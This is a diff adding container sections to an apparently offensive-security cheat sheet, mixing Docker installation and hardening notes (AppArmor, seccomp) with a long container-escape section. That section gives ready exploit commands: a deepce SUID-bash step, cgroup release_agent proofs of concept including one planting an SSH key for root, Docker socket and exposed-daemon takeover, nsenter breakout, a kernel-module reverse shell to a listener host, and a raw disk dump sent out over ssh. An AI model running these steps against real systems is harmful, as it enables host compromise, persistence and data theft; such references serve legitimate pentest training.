@@ -4,6 +4,7 @@
 
 ## Table of Contents
 
+- [deepce](#deepce)
 - [Docker](#docker)
 - [Docker-Compose](#docker-compose)
 - [kubectl](#kubectl)
@@ -26,6 +27,431 @@
 | Kubestriker | A Blazing fast Security Auditing tool for Kubernetes. | https://github.com/vchinnipilli/kubestriker |
 | Peirates | Peirates - Kubernetes Penetration Testing tool | https://github.com/inguardians/peirates |
 | ThreatMapper | Open source cloud native security observability platform. Linux, K8s, AWS Fargate and more. | https://github.com/deepfence/ThreatMapper |
+
+## deepce
+
+```c
+$ ./deepce.sh --exploit SOCK --command "cp /usr/bin/bash /mnt/bash; /usr/bin/chmod 4755 /mnt/bash;"
+```
+
+## Docker
+
+### Installation of the latest Version
+
+> https://docs.docker.com/engine/install/ubuntu/
+
+```c
+$ sudo apt-get update
+$ sudo apt-get install ca-certificates curl gnupg
+```
+
+```c
+$ sudo install -m 0755 -d /etc/apt/keyrings
+$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+$ sudo chmod a+r /etc/apt/keyrings/docker.gpg
+```
+
+```c
+$ echo \
+  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
+  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
+  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+```
+
+```c
+$ sudo apt-get update
+$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+```
+
+### Common Commands
+
+```c
+$ docker pull <IMAGE>                  // pull image
+$ docker pull <IMAGE>:latest           // pull image with latest version
+$ docker pull <IMAGE>:<VERSION>        // pull image with specific version
+$ docker image ls                      // list images
+$ docker image rm <IMAGE>              // remove image
+$ docker image rm <IMAGE>:latest       // remove image with latest version
+$ docker image rm <IMAGE>:<VERSION>    // remove image with specific version
+$ docker run --name <IMAGE>            // use a memorable name
+$ docker run -it <IMAGE> /bin/bash     // interact with image
+$ docker run -it -v /PATH/TO/DIRECTORY:/PATH/TO/DIRECTORY <IMAGE> /bin/bash   // run image and mount specific directory
+$ docker update --restart unless-stopped <CONTAINER>    // auto start container
+$ docker run -d <IMAGE>                // run image in background
+$ docker run -p 80:80 <IMAGE>          // bind port on the host
+$ docker ps                            // list running containers
+$ docker ps -a                         // list all containers
+$ docker stop <ID>                     // stops a specific container
+$ docker rm <ID>                       // delete a specific container
+$ docker exec -it <ID> /bin/bash       // enter a running container
+```
+
+```c
+$ docker -H <RHOST>:2375 info
+$ docker -H <RHOST>:2375 images
+$ docker -H <RHOST>:2375 version
+$ docker -H <RHOST>:2375 ps -a
+$ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
+```
+
+### Dockerfiles
+
+- FROM       // build from a specific base image
+- RUN        // execute command in the container within a new layer
+- COPY       // copy files from the host filesystem
+- WORKDIR    // set the root file system of the container
+- CMD        // determines what command is run when the container starts (Example: CMD /bin/sh -c <FILE>.sh)
+- EXPOSE     // publishes a port in the users context
+
+#### Example Dockerfile
+
+```c
+# Example Dockerfile
+FROM ubuntu:22.04
+
+# Set working directory
+WORKDIR /
+
+# Create a file inside of the root directory
+RUN touch <FILE>
+
+# Perform updates
+RUN apt-get update -y
+
+# Install apache2
+RUN apt-get install apache2 -y
+
+# Expose port 80/TCP
+EXPOSE 80
+
+# Start the service
+CMD ["apache2ctl", "-D","FOREGROUND"]
+```
+
+#### Build Example Dockerfile
+
+```c
+$ docker build -t <NAME> .
+$ docker run -d --name <NAME> -p 80:80 <NAME>
+```
+
+### Capabilities
+
+#### List Capabilities
+
+```c
+$ capsh --print
+```
+
+#### Example
+
+```c
+$ docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE <WEBSERVER>
+```
+
+### AppArmor
+
+```c
+$ aa-status
+```
+
+#### profile.json
+
+- Can read files located in `/var/www/`, `/etc/apache2/mime.types` and `/run/apache2`.
+- Read & write to `/var/log/apache2`.
+- Bind a socket for port `80/TCP` but not other `ports` or `protocols`.
+- `Cannot read` from directories such as `/bin`, `/lib`, `/usr`.
+
+```c
+/usr/sbin/httpd {
+
+  capability setgid,
+  capability setuid,
+
+  /var/www/** r,
+  /var/log/apache2/** rw,
+  /etc/apache2/mime.types r,
+
+  /run/apache2/apache2.pid rw,
+  /run/apache2/*.sock rw,
+
+  # Network access
+  network tcp,
+
+  # System logging
+  /dev/log w,
+
+  # Allow CGI execution
+  /usr/bin/perl ix,
+
+  # Deny access to everything else
+  /** ix,
+  deny /bin/**,
+  deny /lib/**,
+  deny /usr/**,
+  deny /sbin/**
+}
+```
+
+#### Import Profile
+
+```c
+$ apparmor_parser -r -W /PATH/TO/PROFILE/profile.json
+```
+
+#### Apply Profile
+
+```c
+$ docker run --rm -it --security-opt apparmor=/PATH/TO/PROFILE/profile.json <CONTAINER>
+```
+
+### Seccomp
+
+#### profile.json
+
+```c
+{
+  "defaultAction": "SCMP_ACT_ALLOW",
+  "architectures": ["SCMP_ARCH_X86_64"],
+  "syscalls": [
+    {
+      "name": "socket",
+      "action": "SCMP_ACT_ERRNO",
+      "args": []
+    },
+    {
+      "name": "connect",
+      "action": "SCMP_ACT_ERRNO",
+      "args": []
+    },
+    {
+      "name": "bind",
+      "action": "SCMP_ACT_ERRNO",
+      "args": []
+    },
+    {
+      "name": "listen",
+      "action": "SCMP_ACT_ERRNO",
+      "args": []
+    },
+    {
+      "name": "accept",
+      "action": "SCMP_ACT_ERRNO",
+      "args": []
+    }
+    {
+      "name": "read",
+      "action": "SCMP_ACT_ALLOW",
+      "args": []
+    },
+    {
+      "name": "write",
+      "action": "SCMP_ACT_ALLOW",
+      "args": []
+    }
+  ]
+}
+```
+
+#### Apply Profile
+
+```c
+$ docker run --rm -it --security-opt seccomp=/PATH/TO/PROFILE/profile.json <CONTAINER>
+```
+
+### Container Escapes
+
+#### Control Groups (cgroup) Privilege Escalation
+
+> https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.
+
+##### Requirements
+
+* Already root inside a container
+* The container must be run with the SYS_ADMIN Linux capability
+* The container must lack an AppArmor profile, or otherwise allow the mount syscall
+* The cgroup v1 virtual filesystem must be mounted read-write inside the container
+
+##### Checking Capabilities
+
+```c
+$ capsh --print
+```
+
+##### Vulnerability Indicator Flag
+
+```c
+--security-opt apparmor=unconfined --cap-add=SYS_ADMIN
+```
+
+##### Modified PoC by TryHackMe
+
+```c
+$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+$ echo 1 > /tmp/cgrp/x/notify_on_release
+$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+$ echo "$host_path/exploit" > /tmp/cgrp/release_agent
+$ echo '#!/bin/sh' > /exploit
+$ echo "cat /home/cmnatic/<FILE> > $host_path/<FILE>" >> /exploit
+$ chmod a+x /exploit
+$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+##### PoC for SSH Key Deployment
+
+```c
+mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
+echo 1 > /tmp/exploit/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/exploit/release_agent
+
+echo '#!/bin/sh' > /cmd
+echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
+```
+
+#### Docker Socket Privilege Escalation
+
+##### Checking for Docker Socket
+
+```c
+$ ls -la /var/run | grep sock
+```
+
+##### Create a privileged Docker Container and mount the Host Filesystem
+
+```c
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+#### Abusing Exposed Docker Daemon
+
+##### Checking for Misconfiguration
+
+```c
+$ curl http://<RHOST>:2375/version
+```
+
+##### Command Execution
+
+```c
+$ docker -H tcp://<RHOST>:2375 ps
+```
+
+```c
+$ docker -H <RHOST>:2375 commit 01ca084c69b7
+sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
+
+Initial CONTAINER ID: 01ca084c69b7
+New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
+New CONTAINER ID:     aa02ba520ac9
+```
+
+```c
+$ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
+/ # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+#### Abusing Namespaces
+
+##### Verify Environment
+
+```c
+$ ps aux
+```
+
+##### Exploitation via Namespace Enter (nsenter)
+
+```c
+$ nsenter --target 1 --mount --uts --ipc --net /bin/bash
+```
+
+#### Abusing SYS_MODULE Capability
+
+> https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
+
+> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
+
+##### Kernel Module
+
+###### reverse-shell.c
+
+```
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+
+##### Makefile
+
+```c
+obj-m +=reverse-shell.o
+
+all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+        make -C /lib
+```
+
+##### Execution
+
+```c
+$ insmod reverse-shell.ko
+```
+
+#### Abusing CAP_MKNOD Capability
+
+##### Pre-requisites
+
+- 2 shells
+- root privileges inside container
+- CAP_MKNOD
+
+```c
+root@<CONTAINER>:/# mknod sda b 8 0
+root@<CONTAINER>:/# chmod 777 sda
+root@<CONTAINER>:/# su <USERNAME>
+<USERNAME>@<CONTAINER>:/root$ /bin/sh
+```
+
+
+```c
+<USERNAME>@<RHOST>:~$ ps aux | grep /bin/sh
+<USERNAME>     2434  0.0  0.0   2576   932 ?        S+   19:58   0:00 /bin/sh
+<USERNAME>     2438  0.0  0.0   6480  2164 pts/1    S+   19:59   0:00 grep --color=auto /bin/sh
+```
+
+```c
+<USERNAME>@<RHOST>:~$ cd /proc/2434/root
+<USERNAME>@<RHOST>:/proc/2434/root$
+```
+
+Then you can read files through the blob on the host system. Alternatively you can dump them into an image file via SSH.
+
+```c
+$ dd if=/proc/2434/sda bs=512 | gzip -1 - | ssh <USERNAME>@<LHOST> 'dd of=/home/<USERNAME>/image.gz'
+```
 
 ## Docker
 
